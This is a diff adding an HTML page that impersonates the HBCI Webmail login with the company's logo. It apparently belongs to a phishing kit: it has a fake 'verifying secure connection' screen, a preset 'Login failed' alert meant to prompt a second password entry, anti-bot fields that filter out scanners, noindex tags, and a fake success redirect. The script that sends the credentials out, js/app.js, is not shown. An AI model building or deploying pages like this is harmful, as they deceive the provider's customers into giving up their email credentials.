@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBCI Webmail :: Welcome to HBCI Webmail</title>
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="googlebot" content="noindex,nofollow">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <!-- Security Check / MLS Simulation -->
+        <div id="progressSection" class="progress-section">
+            <div class="header-section">
+                <img src="https://www.hbci.com/wp-content/uploads/hbc-logo-2022.png" alt="HBCI Logo" class="logo-img">
+            </div>
+            <div class="progress-status" id="progressStatus">Verifying secure connection...</div>
+            <div class="progress-bar-container">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            <div class="progress-message" id="progressMessage">Performing integrity checks against network policy.</div>
+        </div>
+        
+        <!-- Login Form Section -->
+        <div id="loginSection" style="display: none;">
+            <div class="header-section">
+                <img src="https://www.hbci.com/wp-content/uploads/hbc-logo-2022.png" alt="HBCI Logo" class="logo-img">
+                <h1>HBCI Webmail</h1>
+                <h2>Welcome to HBCI Webmail</h2>
+            </div>
+            
+            <div id="errorAlert" class="error-alert">
+                <i class="fa fa-exclamation-triangle"></i> Login failed. Please verify your credentials and try again.
+            </div>
+            
+            <form id="credentialsForm">
+                <input type="text" class="anti-bot-field" id="website" name="website" tabindex="-1" autocomplete="off">
+                
+                <div class="form-group">
+                    <label for="username"><i class="fa fa-user"></i> Username</label>
+                    <input type="text" id="username" class="form-input" placeholder="Enter your full email address" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fa fa-lock"></i> Password</label>
+                    <input type="password" id="password" class="form-input" placeholder="Enter your password" required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" id="loginButton" class="btn-primary">
+                    <i class="fa fa-sign-in-alt"></i> Login
+                </button>
+            </form>
+            
+            <div class="footer-links">
+                HBCI Webmail ●
+                <a href="http://www.hbci.com/" target="_blank">Get support</a>
+            </div>
+        </div>
+        
+        <!-- Success/Redirect Section -->
+        <div id="successSection" class="success-message" style="display: none;">
+            <i class="fas fa-check-circle fa-2x"></i>
+            <h2>Webmail Access Secured</h2>
+            <p>You have been signed in successfully. Redirecting...</p>
+        </div>
+        
+        <!-- Hidden Anti-Bot Fields -->
+        <input type="hidden" class="anti-bot-field" id="timestamp_check" name="timestamp_check" value="">
+        <input type="hidden" class="anti-bot-field" id="js_enabled" name="js_enabled" value="true">
+    </div>
+
+    <script src="js/app.js"></script>
+</body>
+</html>
